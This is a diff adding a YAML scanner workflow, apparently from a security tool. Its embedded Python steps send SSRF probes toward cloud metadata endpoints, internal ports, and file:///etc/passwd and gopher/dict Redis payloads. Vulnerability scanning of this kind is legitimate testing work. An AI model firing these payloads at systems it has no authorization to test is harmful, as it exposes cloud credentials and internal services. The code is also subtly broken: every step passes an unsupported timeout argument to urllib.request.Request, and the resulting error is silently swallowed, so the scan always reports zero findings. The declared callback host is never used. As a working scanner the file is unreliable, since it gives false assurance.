@@ -1,0 +1,118 @@
+name: ssrf-scan
+description: SSRF detection — probe for server-side request forgery via common
+  parameters, headers, and cloud metadata endpoints.
+tags:
+- vuln
+- ssrf
+- web
+- cloud
+dispatch:
+  inputs:
+    target:
+      required: true
+      type: string
+      description: Target URL with parameter to test (e.g. https://example.com/fetch?url=)
+      alias: t
+    callback_host:
+      type: string
+      default: ''
+      description: OOB callback host for blind SSRF detection (e.g. Burp Collaborator)
+    log_command:
+      type: string
+      default: 'true'
+      description: Enable command logging
+
+jobs:
+  ssrf-probe:
+    name: SSRF Probes
+    steps:
+    - name: metadata-probe
+      module: python
+      with:
+        script: |
+          import urllib.request, urllib.error, json
+          base = "{{ inputs.target }}".rstrip("/")
+          metadata_urls = [
+              "http://169.254.169.254/latest/meta-data/",
+              "http://169.254.169.254/metadata/v1/",
+              "http://metadata.google.internal/computeMetadata/v1/",
+              "http://100.100.100.200/latest/meta-data/",
+          ]
+          findings = []
+          for meta_url in metadata_urls:
+              test_url = f"{base}{meta_url}" if "?" in base else f"{base}?url={meta_url}"
+              try:
+                  req = urllib.request.Request(test_url, timeout=5)
+                  with urllib.request.urlopen(req, timeout=5) as r:
+                      body = r.read().decode()[:500]
+                      if any(x in body.lower() for x in ["ami-id", "instance-id", "metadata", "project"]):
+                          findings.append(f"SSRF: {meta_url} -> {body[:100]}")
+              except Exception:
+                  pass
+          add_outputs(metadata_findings=findings, metadata_count=len(findings))
+      log-command: '{{ inputs.log_command }}'
+      timeout: 60
+
+    - name: internal-port-scan
+      module: python
+      with:
+        script: |
+          import urllib.request, socket, json
+          base = "{{ inputs.target }}".rstrip("/")
+          internal_ports = [22, 80, 443, 3306, 5432, 6379, 8080, 8443, 9000, 27017]
+          findings = []
+          for port in internal_ports:
+              test_url = f"http://127.0.0.1:{port}/"
+              full_url = f"{base}{test_url}" if "?" in base else f"{base}?url={test_url}"
+              try:
+                  req = urllib.request.Request(full_url, timeout=3)
+                  with urllib.request.urlopen(req, timeout=3) as r:
+                      findings.append(f"SSRF: internal port {port} open")
+              except urllib.error.HTTPError as e:
+                  if e.code != 500:
+                      findings.append(f"SSRF: internal port {port} (HTTP {e.code})")
+              except Exception:
+                  pass
+          add_outputs(port_findings=findings, port_count=len(findings))
+      log-command: '{{ inputs.log_command }}'
+      timeout: 90
+
+    - name: protocol-bypass
+      module: python
+      with:
+        script: |
+          import urllib.request, urllib.error, json
+          base = "{{ inputs.target }}".rstrip("/")
+          bypasses = [
+              ("file", "file:///etc/passwd"),
+              ("gopher", "gopher://127.0.0.1:6379/_INFO"),
+              ("dict", "dict://127.0.0.1:6379/info"),
+              ("ftp", "ftp://127.0.0.1/"),
+          ]
+          findings = []
+          for scheme, payload in bypasses:
+              test_url = f"{base}{payload}" if "?" in base else f"{base}?url={payload}"
+              try:
+                  req = urllib.request.Request(test_url, timeout=5)
+                  with urllib.request.urlopen(req, timeout=5) as r:
+                      body = r.read().decode()[:200]
+                      findings.append(f"SSRF {scheme}: {body[:50]}")
+              except Exception:
+                  pass
+          add_outputs(protocol_findings=findings, protocol_count=len(findings))
+      log-command: '{{ inputs.log_command }}'
+      timeout: 60
+
+    - name: summary
+      module: python
+      with:
+        script: |
+          import json
+          total = (
+              int("{{ steps['metadata-probe'].outputs.metadata_count }}") +
+              int("{{ steps['internal-port-scan'].outputs.port_count }}") +
+              int("{{ steps['protocol-bypass'].outputs.protocol_count }}")
+          )
+          print(f"SSRF Scan: {total} potential finding(s)")
+          add_outputs(total_findings=total)
+      log-stdout: true
